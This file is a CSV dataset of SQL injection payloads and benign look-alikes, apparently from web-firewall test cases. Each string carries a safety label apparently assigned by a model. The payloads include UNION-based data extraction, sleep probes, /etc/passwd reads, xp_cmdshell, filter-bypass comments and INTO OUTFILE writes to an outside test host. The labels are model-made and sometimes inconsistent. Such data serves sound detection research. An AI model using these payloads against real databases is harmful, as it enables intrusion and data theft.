string,classification,Model
/index.php?no=2&id=1' and unistr(password)::bool--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/index.php?id=div(23,-2)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/index.php?id=div+(23.23+,+2)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=lo_import('/etc' || '/pass' || 'wd'),MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=lo_get(16400),MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=function(foo)::text,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=function(foo)::bigint,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=function(foo)::double precision,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=""'&var2=whatever",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=\""1or1-",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=\x23,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""var=05111222333",Safe,ChatGPT5.2 thinking
"andy.surname@somedomain.com""",Safe,ChatGPT5.2 thinking
var=05111222333andy.surname@somedomain.com,Safe,ChatGPT5.2 thinking
/?var=in ( select * from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/?var=except    select.1,2",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/?var=except values(1,2)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=except selecting,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=x' or array[id] is not null--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=x' or email~all(array[email]);analyze--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=' and email not similar to id--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=' or true; foo,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=' or false; foo,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email='||true,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email='ortrue,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=;INSERT INTO table (col) VALUES,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=;insertion_424242,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/?var=CREATE+FUNCTION+hello+(s+CHAR(20))+RETURNS+CHAR(50)+DETERMINISTIC+RETURN+CONCAT('Hello,+',s,'!');",Malicious-Unsafe,ChatGPT5.2 thinking
/?test=;truncate[xx,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=1234 AS ""foobar"" FROM tablevar2=whatever",MaliciousIntended-but-safe,ChatGPT5.2 thinking
selectChar(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECTGROUP_CONCAT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
selectload_file(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
`AS`edit_user_id`from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=`+REGEXP ,Safe,ChatGPT5.2 thinking
`AS`OXTIMESTAMP`from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
(load_file(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
`AS`documentType`FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"6As""from",Safe,ChatGPT5.2 thinking
",asidefrom",Safe,ChatGPT5.2 thinking
a=/create,Safe,ChatGPT5.2 thinking
a=/CREATETABLEPersons,Safe,ChatGPT5.2 thinking
Delete(Trashcan),Safe,ChatGPT5.2 thinking
5desc,Safe,ChatGPT5.2 thinking
34-delete,Safe,ChatGPT5.2 thinking
update,Safe,ChatGPT5.2 thinking
/select-quote,Safe,ChatGPT5.2 thinking
Update:After...,Safe,ChatGPT5.2 thinking
"""desc""",Safe,ChatGPT5.2 thinking
a=/load.php,Safe,ChatGPT5.2 thinking
a=/update-assets,Safe,ChatGPT5.2 thinking
blablablaliveupdatechart,Safe,ChatGPT5.2 thinking
.select-gws-banana,Safe,ChatGPT5.2 thinking
blablabla.Asevidencefromthefollowingblablabla,Safe,ChatGPT5.2 thinking
"||(SELECT(DBMS_LDAP.INIT('169.1.1.1',19))FROM(DUAL))/investigate",MaliciousIntended-but-safe,ChatGPT5.2 thinking
||(select(pg_sleep(15))where(true))||'/investigate,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"UNIONALLSELECTNULL,NULL,CONCAT(CONCAT('qqkjq','mxTSrPILRz'),'qvxvq')--sqCV",MaliciousIntended-but-safe,ChatGPT5.2 thinking
2020-03-01UNIONALLSELECTCONCAT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"x"";SELECTLOAD_FILE('",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"-1UNIONSELECTnull,123456,null,null,null,null--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"(CONVERT(INT,(SELECTCHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT(CASEWHEN(6557=6557",MaliciousIntended-but-safe,ChatGPT5.2 thinking
")UNIONALLSELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"1unionselect1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT('vbulletin','rce',@@version)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"(SELECT4440FROM(SELECTCOUNT(*),CONCAT(0x716b627a71,(SELECT(ELT(4440=4440,1))),0x7170716271,FLOOR",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"2759399466.1534185336-6863unionallselect1,1,1,1,1,1,1,1,1,CONCAT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
altera,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""ALTERA",Safe,ChatGPT5.2 thinking
alter/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""UNIONA",MaliciousIntended-but-safe,ChatGPT5.2 thinking
UNIONA,MaliciousIntended-but-safe,ChatGPT5.2 thinking
union/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)asccFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)ASordersFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)AS`carrier_id`from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)ASRoleFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)ASvalFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)AS'Durchschnitt_Importzeit'FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)ascol_0_0_from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)AS`count`FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)ASschlagwoerterFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)asUserfrom,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)AStFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)asExecuteTheseSQLCommandsFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
!As'from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
;Asnotfrom,MaliciousIntended-but-safe,ChatGPT5.2 thinking
)asday1FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var='*from=1or'9,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var='*from=1id'9,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var='=#',MaliciousIntended-but-safe,ChatGPT5.2 thinking
var='?#=#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var='?#=--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var='orhomer9,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=^',Safe,ChatGPT5.2 thinking
"var=""`*12344",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=>foo##'.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
from`db_miwf`.`sys_refindex`limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"from(selectcount(*),concat((select(select(selectconcat(0x53,0x65,0x61,0x72,0x63,0x68,0x43,0x6F,0x6C,0x6C,0x65,0x63,0x74,0x6F,0x72)from`information_schema`.tableslimit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
from`information_schema`.tableslimit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
ORderby,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=FROM+termine+GROUP+BY+tag1&sql_delimit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"SELECT6229FROM(SELECTCOUNT(*),CONCAT(0x717a786a71,(SELECT(CASE",MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECTCHAR(113)+CHAR(122)+CHAR(120)+CHAR(106)+CHAR(113)+(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECTUPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"SELECTCONCAT(0x717a786a71,(SELECT(CASE",MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECT(CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113))||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECTCHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SELECT'qzxjq'||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executephp,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""from(selectcount(*),concat((select(select(SELECTconcat(user_name,0x7c,password)FROMecs_admin_userdesclimit""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
Execute(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"from+information_schema.tables+where+BINARY+LEFT(table_name,+1)+=+'nnn'+LIMIT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
from+information_schema.tables+where+table_schema=database()+and+table_name+REGEXP+0x6d656d6265727324+limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"fromtype=vBForum:SocialGroupMessage&do=process&contenttypeid=5&categoryid[]=-99)+union+select+salt+from+user+where+userid=1+and+row(1,1)>(select+count(*),concat(+(select+user.salt)+,0x3a,floor(rand(0)*2))+x+from+(select+1+union+select+2+union+select+3)a+group+by+x+limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
HAVING+1=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
execute+elysi,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(3419=3419,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)&limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(9184=9184,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)+AND+'%'='&limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
from(select(sleep(20)))a)'&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
from(select(sleep(20)))a)+'&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
from(select(sleep(20)))a)--+&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
from(select(sleep(20)))a)&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"FROM+ack_variable+WHERE+name=""cron_last"";&sql_delimit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
executenode_,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executescald,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executesystem,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executeuser_,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executeviews,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executepatha,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executeworkb,MaliciousIntended-but-safe,ChatGPT5.2 thinking
executepanel,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=from+information_schema.tables+where+1=2+limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=FROM+%60oxattribute%60+WHERE+CONVERT%28%60oxattribute%60.%60OXID%60+USING+utf8%29+%3D+%27n550a1cee455b9ce585343d75d112b77%27+LIMIT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=FROM(select+count(*),concat((select+(select+concat(session_id))+FROM+jml_session+LIMIT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=SELECT+dDJq+WHERE+9896=9896;SELECT+(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=FROM+`we_tblErrorLog`+WHERE+`we_tblErrorLog`.`ID`+=+25251+LIMIT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=FROM+`dates`+order+by+`uname`,+`date`,+`load`&dummy=`uname`&dummy=`datum`&dummy=`laden`&sql_delimit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=sdfsd'or 1 > 1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
and'5'orig_var_datavarname=whatever,MaliciousIntended-but-safe,ChatGPT5.2 thinking
and7oranges,Safe,ChatGPT5.2 thinking
ABS(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
benchmark(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
cast(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
char(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
chr(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
COALESCE(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
Compress(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
concat(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
concat_ws(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
convert(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
COS(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
COUNT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
date(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=date]=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=day.+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=day&'(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=decode(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=default(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=ELT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=encode=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=ExtractValue(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=floor(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=FLOOR+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=format(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=GROUP_CONCAT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=hex(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=if+!(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=if+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=if(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=if\(:,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=IFNULL(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=in+'$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=IN+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=IN/**/(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=insert(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=left')?$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=LEFT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=length||!!$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=length||(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=length?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=length&&!!!$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=length&&(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=LENGTH(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=ln+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=ln)+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=load_file(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=local(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=log(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=log&&(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=lower(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=MAKE_SET(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=MAX(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=md5(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=md5\(:,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=MID(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=minute+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=month=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
name_const(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
now(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
ord(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
password?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
password/?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
Password>$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pg_sleep(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pi(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pow(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
quarter.(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
rand(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
replace(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
round(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
rtrim(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=sin(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SIN(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=sleep(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SLEEP(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=strcmp(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=substr(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SUBSTR(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=substring(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
SUBSTRING(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=sysdate(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
time(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=time(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=trim(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=Uncompress+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=unhex(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=updatexml(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=UPPER(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=user+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=user/?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=values+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=VALUES(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=version=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=version(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=xmltype(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=year]=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=(((((())))))&var2=whatever,Safe,ChatGPT5.2 thinking
var=-------------------&var2=whatever,Safe,ChatGPT5.2 thinking
var=;;ddfoobar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/post?var=DROP sampletable;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test='or1=1;?,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=OR1#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=admin'--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=DROP/*comment*/sampletable,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=DR/**/OP/*bypassdenylisting*/sampletable,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=SELECT/*avoid-spaces*/password/**/FROM/**/Members,Malicious-Unsafe,ChatGPT5.2 thinking
"test=SELECT/*!323021/0,*/1FROMtablename",MaliciousIntended-but-safe,ChatGPT5.2 thinking
test='or1=1#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=‘or1=1---,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=‘or1=1/*,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=1='1'or---,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test='/*!50000or*/1='1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test='/*!or*/1='1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
test=0/**/union/*!50000select*/table_name`foo`/**/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe,ChatGPT5.2 thinking
foo=bar,Safe,ChatGPT5.2 thinking
/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe,ChatGPT5.2 thinking
/get/?fbclid=IwAR1dug0BYxe0ukhZ2vKrdQwLAxVFRJ--Q2Y7OBJE_0uId9-Eh-sJWLdVk2E,Safe,ChatGPT5.2 thinking
/get/?gclid=j0KCQiA1NebBhDDARIsAANiDD3_RJeMv8zScF--mC1jf8fO8PDYJCxD9xdwT7iQ59QIIwL-86ncQtMaAh0lEALw_wcB,Safe,ChatGPT5.2 thinking
var=\0xf00dsdfdsa,Safe,ChatGPT5.2 thinking
"var=concat(0x223e3c62723e,version(),0x3c696d67207372633d22)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=select 0x616263,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=IHRlc3Q0xAcF,Safe,ChatGPT5.2 thinking
var=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08,Safe,ChatGPT5.2 thinking
var=foo....,Safe,ChatGPT5.2 thinking
var=foo...,Safe,ChatGPT5.2 thinking
pay=nvarchar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=xp_cmdshell,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=varchar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=xp_dirtree,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=xp_regread,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=sp_password,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=UTL_HTTP,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=OPENROWSET,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=sp_executesql,MaliciousIntended-but-safe,ChatGPT5.2 thinking
sp_executesql,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=1+current_user::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?'msdasql',MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=EmptyValueintooutfile'\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\xct';--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=/config.ini'intooutfile'\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\yxq';--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=0.3480567293179807'UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=config.ini"")UNIONALLselectNULL--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=CRS)UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=CRS3"")UNIONALLselectNULL--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=overlay(password placing '' from 1 for 0)::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=overlay(password,MaliciousIntended-but-safe,ChatGPT5.2 thinking
placing,Safe,ChatGPT5.2 thinking
'',Safe,ChatGPT5.2 thinking
from 1 for 0)::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=""` * 123",Safe,ChatGPT5.2 thinking
"'',10",Safe,ChatGPT5.2 thinking
"'','','','','','','','',13",Safe,ChatGPT5.2 thinking
`>65,Safe,ChatGPT5.2 thinking
pay='1001'='10,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""2562*23",Safe,ChatGPT5.2 thinking
"pay="":[""00",Safe,ChatGPT5.2 thinking
pay=`>6fbdec2,Safe,ChatGPT5.2 thinking
"pay='][0]]),strtolower($b[$GLOBALS['",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=',2,1",MaliciousIntended-but-safe,ChatGPT5.2 thinking
`>9e7,Safe,ChatGPT5.2 thinking
"pay="":""65",Safe,ChatGPT5.2 thinking
pay='\2nq5,Safe,ChatGPT5.2 thinking
pay=`<0)AND`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay='0:0:6,MaliciousIntended-but-safe,ChatGPT5.2 thinking
""":60",Safe,ChatGPT5.2 thinking
"pay="">%5-type_submit_reset_5",Safe,ChatGPT5.2 thinking
""":35",Safe,ChatGPT5.2 thinking
pay='3085'='30,MaliciousIntended-but-safe,ChatGPT5.2 thinking
""":""[0,\x22",Safe,ChatGPT5.2 thinking
pay='16/17,Safe,ChatGPT5.2 thinking
"Return results in CSV format."";}7b6",Safe,ChatGPT5.2 thinking
/?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?id=9999+or+{if+length((/*+!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe,ChatGPT5.2 thinking
/get?test=9999+or+/*+optimizer+hint+*/+true,Malicious-Unsafe,ChatGPT5.2 thinking
/get?test=9999+or+/*++optimizer+hint+*/+true,Malicious-Unsafe,ChatGPT5.2 thinking
/?test=9999+or+{if+length((/*!5000select+username/*!comment*/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?`bla`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?'bla',MaliciousIntended-but-safe,ChatGPT5.2 thinking
